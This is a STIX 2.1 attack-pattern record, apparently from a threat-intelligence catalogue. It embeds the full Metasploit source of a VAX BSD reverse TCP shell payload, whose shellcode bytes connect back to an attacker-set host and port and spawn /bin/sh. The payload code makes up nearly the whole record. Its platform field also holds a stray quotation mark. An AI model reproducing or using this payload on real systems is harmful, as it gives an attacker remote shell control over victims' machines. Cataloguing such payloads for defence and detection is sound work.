{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8aa1205c-d5f1-4145-bab7-13914a31d293",
    "created": "2024-08-14T16:33:19.403931Z",
    "modified": "2024-08-14T16:33:19.403935Z",
    "name": "BSD Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/vax/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 100\n\n  # This is so one-off that we define it here\n  ARCH_VAX = 'vax'\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'BSD Command Shell, Reverse TCP Inline',\n      'Description' => 'Connect back to attacker and spawn a command shell',\n      'Author'      => 'wvu',\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'bsd',\n      'Arch'        => ARCH_VAX,\n      'Handler'     => Msf::Handler::ReverseTcp,\n      'Session'     => Msf::Sessions::CommandShellUnix,\n      'Payload'     => {\n        'Offsets'   => {\n          'LHOST'   => [24, 'ADDR'],\n          'LPORT'   => [32, 'n']\n        },\n        'Payload'   =>\n          \"\\xdd\\x00\" +                 # pushl  $0\n          \"\\xdd\\x01\" +                 # pushl  $1\n          \"\\xdd\\x02\" +                 # pushl  $2\n          \"\\xdd\\x03\" +                 # pushl  $3\n          \"\\xd0\\x5e\\x5c\" +             # movl   sp,ap\n          \"\\xbc\\x8f\\x61\\x00\" +         # chmk   $61\n          \"\\xd0\\x50\\x5a\" +             # movl   r0,r10\n          \"\\xdd\\x00\" +                 # pushl  $0\n          \"\\xdd\\x00\" +                 # pushl  $0\n          \"\\xdd\\x8f\\x00\\x00\\x00\\x00\" + # pushl  LHOST\n          \"\\xdd\\x8f\\x02\\x00\\x00\\x00\" + # pushl  AF_INET + LPORT\n          \"\\xd0\\x5e\\x5b\" +             # movl   sp,r11\n          \"\\xdd\\x10\" +                 # pushl  $10\n          \"\\xdd\\x5b\" +                 # pushl  r11\n          \"\\xdd\\x5a\" +                 # pushl  r10\n          \"\\xdd\\x03\" +                 # pushl  $3\n          \"\\xd0\\x5e\\x5c\" +             # movl   sp,ap\n          \"\\xbc\\x8f\\x62\\x00\" +         # chmk   $62\n          \"\\xd0\\x00\\x5b\" +             # movl   $0,r11\n          \"\\xdd\\x5b\" +                 # pushl  r11\n          \"\\xdd\\x5a\" +                 # pushl  r10\n          \"\\xdd\\x02\" +                 # pushl  $2\n          \"\\xd0\\x5e\\x5c\" +             # movl   sp,ap\n          \"\\xbc\\x8f\\x5a\\x00\" +         # chmk   $5a\n          \"\\xf3\\x02\\x5b\\xef\" +         # aobleq $2,r11,dup2\n          \"\\xdd\\x8f\\x2f\\x73\\x68\\x00\" + # pushl  $68732f\n          \"\\xdd\\x8f\\x2f\\x62\\x69\\x6e\" + # pushl  $6e69622f\n          \"\\xd0\\x5e\\x5b\" +             # movl   sp,r11\n          \"\\xdd\\x00\" +                 # pushl  $0\n          \"\\xdd\\x00\" +                 # pushl  $0\n          \"\\xdd\\x5b\" +                 # pushl  r11\n          \"\\xdd\\x03\" +                 # pushl  $3\n          \"\\xd0\\x5e\\x5c\" +             # movl   sp,ap\n          \"\\xbc\\x3b\"                   # chmk   $3b\n      }\n    ))\n  end\n\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}